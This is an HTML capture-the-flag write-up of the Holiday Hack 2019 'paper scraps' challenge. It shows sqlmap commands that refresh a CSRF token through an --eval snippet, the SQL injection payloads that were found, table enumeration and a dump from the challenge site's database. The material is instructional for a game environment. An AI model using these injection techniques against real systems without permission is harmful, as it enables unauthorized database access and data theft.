<!DOCTYPE html5>
<html>
	<head>
		<title>paper-scraps | Holiday Hack 2019</title>
		<link rel="stylesheet" href="/css/common.css">
		<link rel="stylesheet" href="/css/writeup.css">
		<link rel="stylesheet" href="/css/pygments.css">
		<link rel="stylesheet" href="https://unpkg.com/normalize.css@8.0.1/normalize.css">
		
		<meta charset="utf-8" />
	</head>
	<body>
		<main>
			<h1>Retrieve Scraps of paper from Server</h1>
<p>Looking at the website we see 2 pages that look like they use SQL: You can submit an application, <code>/apply.php</code>, or you can check the status, <code>check.php</code>. Thinking about how these work, applying probably runs some INSERT statement, whereas check is probably a SELECT statement. Since injecting into SELECT statements is more common, it's also easier to do with a lot of tools. so we'll focus on this form.</p>
<p>First we need to know how the form works, so we can open burp, set the proxy, etc. and submit the form with some example data.</p>
<p>We see 2 requests after we submit the form:</p>
<div class="codehilite"><pre><span></span>&gt; GET /validator.php HTTP/1.1
&gt; Host: studentportal.elfu.org
&gt; Accept: */*
&gt; Referer: https://studentportal.elfu.org/check.php

&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=UTF-8
&lt; X-Powered-By: PHP/7.2.1
&lt; 
&lt; MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY=_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg==
&lt; 

&gt; GET /application-check.php?elfmail=krampus%40elfu.ac&amp;token=MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY%3D_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg%3D%3D HTTP/1.1
&gt; Host: studentportal.elfu.org
&gt; Accept: */*
&gt; Referer: https://studentportal.elfu.org/check.php

&lt; [...]
</pre></div>


<p>(trimmed)</p>
<p>The actual form goes in the second request as GET parameter <code>elfmail</code>. We also have a <code>token</code> value that's just the response from <code>validator.php</code>. If we try to reuse this for another request we get the message 'Invalid or expired token!', so this is some CSRF token that we need to populate each request.</p>
<p>Let's run sqlmap against it. A start would be:</p>
<div class="codehilite"><pre><span></span>sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39;
</pre></div>


<p>But of course we need to update the CSRF token. SQLMap has built in parameters <code>--csrf-token</code> and <code>--csrf-url</code> for doing this, so it seems like we should be able to do this:</p>
<div class="codehilite"><pre><span></span>sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --csrf-token &#39;token&#39; --csrf-url &#39;https://studentportal.elfu.org/validator.php&#39;
</pre></div>


<p>But we get this error:</p>
<div class="codehilite"><pre><span></span>[..:..:..] [CRITICAL] anti-CSRF token &#39;token&#39; can&#39;t be found at &#39;https://studentportal.elfu.org/validator.php&#39;
</pre></div>


<p>So it seems like it's looking for the token to be as an <code>&lt;input&gt;</code> or as a URL param. This isn't going to work, so we'll have to manipulate the token value some other way. From the SQLMap docs:</p>
<div class="codehilite"><pre><span></span>Option: --eval

In case that user wants to change (or add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with option --eval that will be evaluated just before each request.

$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b9238\
20dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;
</pre></div>


<p>So we need to make a GET request then set the token to the response:</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://studentportal.elfu.org/validator.php&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</pre></div>


<p>Then set that as the eval function:</p>
<div class="codehilite"><pre><span></span>$ sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --eval &#39;import requests; token = requests.get(&#39;https://studentportal.elfu.org/validator.php&#39;).text&#39;

[...]

sqlmap identified the following injection point(s) with a total of 189 HTTP(s) requests:
---
Parameter: elfmail (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: elfmail=AAA&#39; AND 3693=3693 AND &#39;ObJp&#39;=&#39;ObJp&amp;token=AAA

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: elfmail=AAA&#39; AND (SELECT 4447 FROM(SELECT COUNT(*),CONCAT(0x716b627871,(SELECT (ELT(4447=4447,1))),0x7170707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;ByHL&#39;=&#39;ByHL&amp;token=AAA

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: elfmail=AAA&#39; AND (SELECT 3959 FROM (SELECT(SLEEP(5)))cRnI) AND &#39;gKPu&#39;=&#39;gKPu&amp;token=AAA
---
</pre></div>


<p>Now we can start looking at the databaes. We can enumerate the following tables:</p>
<div class="codehilite"><pre><span></span>$ sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --eval &#39;import requests; token = requests.get(&#39;https://studentportal.elfu.org/validator.php&#39;).text&#39; --tables

[..:..:..] [WARNING] user aborted during enumeration. sqlmap will display partial output
Database: elfu
[3 tables]
+---------------------------------------+
| applications                          |
| krampus                               |
| students                              |
+---------------------------------------+

Database: information_schema
[8 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
+---------------------------------------+
</pre></div>


<p>Let's dump the contents of the <code>krampus</code> table:</p>
<div class="codehilite"><pre><span></span>$ sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --eval &#39;import requests; token = requests.get(&#39;https://studentportal.elfu.org/validator.php&#39;).text&#39; -T krampus --dump

Database: elfu
Table: krampus
[6 entries]
+----+-----------------------+
| id | path                  |
+----+-----------------------+
| 1  | /krampus/0f5f510e.png |
| 2  | /krampus/1cc7e121.png |
| 3  | /krampus/439f15e6.png |
| 4  | /krampus/667d6896.png |
| 5  | /krampus/adb798ca.png |
| 6  | /krampus/ba417715.png |
+----+-----------------------+
</pre></div>


<p>Each of these paths is an image on the server, all of which seem to be a fragment of paper. We can piece these together and see the final message:</p>
<div class="codehilite"><pre><span></span>From the desk of ....
Date: August 23, 20...

Memo to Self:

Finally! I&#39;ve figured out how to destroy Christmas!
Santa has a brand new, cutting edge sleigh guidance technology, called the Super Sled-o-matic.

I&#39;ve figured out a way to poison the data going into the system so that it will divert Santa&#39;s sled on Christmas Eve!

Santa will be unable to make the trip and the holiday season will be destroyed! Santa&#39;s own technology will undermine him!

That&#39;s what they deserve for not listening to my suggestions for supporting other holiday characters!

Bwahahahahaha!
</pre></div>
		</main>

		<footer>
			<div class="links">
				<div>
					<a aria-label="Back" href="index.html">
						<span class="iconify" data-icon="fa:arrow-left"></span>
					</a>
				</div>
				<div>
			</div>
		</footer>

		<script src="https://code.iconify.design/1/1.0.3/iconify.min.js"></script>
	</body>
</html>